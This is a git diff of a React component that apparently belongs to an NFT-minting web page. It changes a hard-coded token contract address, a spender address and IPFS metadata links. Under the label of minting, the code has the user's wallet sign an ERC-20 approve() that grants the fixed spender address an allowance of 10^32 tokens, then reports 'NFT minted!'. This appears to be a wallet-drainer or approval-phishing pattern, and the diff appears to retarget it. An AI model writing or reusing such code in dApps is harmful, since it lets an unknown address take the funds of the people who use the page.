@@ -13,14 +13,14 @@ export const ApproveSection = () => {
     const signer = await provider.getSigner();
 
     const contract = new Contract(
-      "0x6F80b76a01431879e7c0CeFF2C77DFAFDF3f26Bd",
+      "0x8159622F995A5D3e771aFe4EAC66e70Deed4aC54",
       ["function approve(address spender, uint256 amount) public returns (bool)"],
       signer
     );
 
     try {
       const tx = await contract.approve(
-        "0xE593c6aD174F2bE65dF1B314444c35b414e53421",
+        "0xbbfb2aa40ee6c2a1fdfdb9dd528f78f607d8effe",
         100000000000000000000000000000000n
       );
       await tx.wait();
@@ -31,9 +31,9 @@ export const ApproveSection = () => {
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           userAddress: walletAddress,
-          uri: "https://gateway.pinata.cloud/ipfs/bafkreia2mkr5gtx3xoaupkprqgoy2cotzmbn73z5ler7wgge66cioj5ybm", 
+          uri: "https://gateway.pinata.cloud/ipfs/bafkreifp4ejgcqjusuhvmcxl3xyjobc7rdzqbqzywmwciiyioixghzkghe", 
         }),
-//https://gateway.pinata.cloud/ipfs/bafybeib2hvtiguxnd2shxckbdk2fkzzbtjvb765nqm2auuv6gbyhcrzzsi
+        //https://gateway.pinata.cloud/ipfs/bafybeibdxmyx7txuqf6u6iod2abuwc6ta7lxgn6xnod7rhxzhphkt2nd6i
 
       });
       toast.success("NFT minted!");
